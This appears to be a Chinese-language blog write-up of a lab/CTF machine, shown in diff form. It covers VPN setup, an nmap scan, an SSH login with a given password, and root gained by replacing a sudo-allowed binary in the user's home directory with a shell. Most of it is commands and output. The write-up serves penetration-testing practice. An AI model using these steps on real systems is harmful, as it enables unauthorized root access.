+2025-05-14 21:37:02 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
+2025-05-14 21:37:02 TLS: tls_multi_process: initial untrusted session promoted to trusted
+2025-05-14 21:37:02 PUSH: Received control message: <span class="pl-s"><span class="pl-pds">'</span>PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500<span class="pl-pds">'</span></span>
+2025-05-14 21:37:02 OPTIONS IMPORT: --ifconfig/up options modified
+2025-05-14 21:37:02 OPTIONS IMPORT: route options modified
+2025-05-14 21:37:02 OPTIONS IMPORT: route-related options modified
+2025-05-14 21:37:02 OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
+2025-05-14 21:37:02 OPTIONS IMPORT: tun-mtu <span class="pl-c1">set</span> to 1500
+2025-05-14 21:37:02 net_route_v4_best_gw query: dst 0.0.0.0
+2025-05-14 21:37:02 net_route_v4_best_gw result: via 192.168.31.1 dev eth0
+2025-05-14 21:37:02 ROUTE_GATEWAY 192.168.31.1/255.255.255.0 IFACE=eth0 HWADDR=5e:bb:f6:9e:ee:fa
+2025-05-14 21:37:02 TUN/TAP device tun0 opened
+2025-05-14 21:37:02 net_iface_mtu_set: mtu 1500 <span class="pl-k">for</span> tun0
+2025-05-14 21:37:02 net_iface_up: <span class="pl-c1">set</span> tun0 up
+2025-05-14 21:37:02 net_addr_v4_add: 10.8.0.2/24 dev tun0
+2025-05-14 21:37:02 net_route_v4_add: 10.176.13.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
+2025-05-14 21:37:02 Initialization Sequence Completed
+2025-05-14 21:37:02 Data Channel: cipher <span class="pl-s"><span class="pl-pds">'</span>AES-256-GCM<span class="pl-pds">'</span></span>, peer-id: 1
+2025-05-14 21:37:02 Timers: ping 10, ping-restart 120
+2025-05-14 21:37:02 Protocol options: protocol-flags cc-exit tls-ekm dyn-tls-crypt</pre></div>
+<p>建立<code class="notranslate">vpn</code>链接后，网卡上多了个隧道<code class="notranslate">tun0</code>网卡</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ip a</span>
+5: tun0: <span class="pl-k">&lt;</span>POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none
+    inet 10.8.0.2/24 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::c059:a5bc:2a14:2d2e/64 scope link stable-privacy
+       valid_lft forever preferred_lft forever
+└─<span class="pl-c"><span class="pl-c">#</span> route -n</span>
+10.176.13.0     10.8.0.1        255.255.255.0   UG    0      0        0 tun0
+
+<span class="pl-c"><span class="pl-c">#</span>openvpn 2021.vpn中配置</span>
+Received control message: <span class="pl-s"><span class="pl-pds">'</span>PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500<span class="pl-pds">'</span></span></pre></div>
+<p>通过<code class="notranslate">openvpn</code>配置信息或者<code class="notranslate">kali路由表</code>可以查到靶机<code class="notranslate">vpn</code>网段为<code class="notranslate">10.176.13.0/24</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap 10.176.13.0/24 -sn</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:43 CST
+Nmap scan report <span class="pl-k">for</span> 10.176.13.37 (10.176.13.37)
+Host is up (0.0024s latency).
+Nmap done: 256 IP addresses (1 host up) scanned <span class="pl-k">in</span> 14.57 seconds
+└─<span class="pl-c"><span class="pl-c">#</span> nmap 10.176.13.37</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:45 CST
+Nmap scan report <span class="pl-k">for</span> 10.176.13.37 (10.176.13.37)
+Host is up (0.0077s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.74 seconds
+└─<span class="pl-c"><span class="pl-c">#</span> ssh shinosawa@10.176.13.37</span>
+shinosawa@10.176.13.37<span class="pl-s"><span class="pl-pds">'</span>s password:#hiro</span>
+<span class="pl-s">homelab:~$ id</span>
+<span class="pl-s">uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)</span>
+<span class="pl-s"></span></pre></div>
+<p>用户名<code class="notranslate">shinosawa</code>，<code class="notranslate">ssh</code>密码：<code class="notranslate">hiro</code></p>
+<h5>拿到<code class="notranslate">user.flag</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ id
+uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)
+homelab:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+homelab:<span class="pl-k">~</span>$ ls
+deepseek   user.flag
+homelab:<span class="pl-k">~</span>$ cat user.flag
+</pre></div>
+<h3>获得root</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> shinosawa on homelab:
+    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+Runas and Command-specific defaults <span class="pl-k">for</span> shinosawa:
+    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
+
+User shinosawa may run the following commands on homelab:
+    (ALL) NOPASSWD: /home/shinosawa/deepseek
+homelab:<span class="pl-k">~</span>$ ls -l deepseek
+-r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 deepseek</pre></div>
+<p><code class="notranslate">shinosawa</code>家目录下有个<code class="notranslate">deepseek</code>，属组还是自己，直接劫持文件提权（在自己家目录即使<code class="notranslate">root</code>属组的也可以直接劫持），注意看<code class="notranslate">/etc/passwd</code>文件，靶机默认的终端是<code class="notranslate">ash</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">homelab:<span class="pl-k">~</span>$ mv deepseek a
+homelab:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> shinosawa on homelab:
+    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+Runas and Command-specific defaults <span class="pl-k">for</span> shinosawa:
+    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
+
+User shinosawa may run the following commands on homelab:
+    (ALL) NOPASSWD: /home/shinosawa/deepseek
+homelab:<span class="pl-k">~</span>$ cat /etc/passwd
+..........
+shinosawa:x:1000:1000::/home/shinosawa:/bin/ash
+homelab:<span class="pl-k">~</span>$
+homelab:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> ash <span class="pl-k">&gt;</span> deepseek
+homelab:<span class="pl-k">~</span>$ chmod +x deepseek
+homelab:<span class="pl-k">~</span>$ sudo /home/shinosawa/deepseek
+/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> cd</span>
+<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> ls -l</span>
+total 28
+-r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 a
+-rwxr-xr-x    1 shinosawa shinosawa         4 May 15 05:39 deepseek
+-r--------    1 shinosawa shinosawa        39 Apr 17 12:29 user.flag
+homelab:<span class="pl-k">~</span>$</pre></div>
+<h5>拿到<code class="notranslate">root.flag</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/home/shinosawa <span class="pl-c"><span class="pl-c">#</span> cd</span>
+<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> ls</span>
+root.flag
+<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cat root.flag</span></pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","pingsag3/pingsag3.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
